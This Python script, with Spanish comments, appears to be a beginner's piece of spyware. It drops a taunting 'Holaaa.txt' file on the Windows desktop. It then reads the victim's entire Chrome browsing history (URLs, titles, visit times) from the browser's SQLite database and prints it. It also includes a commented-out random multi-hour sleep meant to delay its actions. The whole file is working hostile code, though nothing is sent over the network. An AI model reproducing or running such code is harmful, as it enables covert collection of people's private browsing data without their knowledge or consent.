import os
from random import randrange
from time import sleep
import sqlite3

HACKER_FILE_NAME = "Holaaa.txt"


def delay_action():
    hours_g = randrange(7200,10800)#Generador de segundos
    #-------------------------------------Se convierten de seg a horas para que el usuario pueda ver la correcta conversión
    print("Durmiendo {} horas ".format((hours_g/60)/60.))
    sleep(hours_g) 


def create_hacker_file(user_path):
    hacker_file = open(user_path + "\\OneDrive\\Escritorio\\" + HACKER_FILE_NAME,"w") 
    hacker_file.write("Hola soy un hijo de dios")
    return hacker_file


def get_chrome_history(user_path):
    try:
        history_path = user_path + "\\AppData\Local\\Google\\Chrome\\User Data\\Default\\History"
        connecting = sqlite3.connect(history_path)
        cursor = connecting.cursor()
        cursor.execute("SELECT title, last_visit_time, url FROM urls ORDER BY  last_visit_time DESC")
        urls = cursor.fetchall()
        print(urls)
        connecting.close() 
        return urls
    except sqlite3.OperationalError:
        return None


def main():

    #delay_action()   
    # Calculamos la rusta del usuario de windows    
    user_path = "C:\\Users\\" + os.getlogin()
    print(user_path)
    #Creamos un archivo en el escritorio
    hacker_file = create_hacker_file(user_path)  
    #Recojemos el historial de google chrome
    chrome_history= get_chrome_history(user_path)


if __name__ == "__main__":
    main()
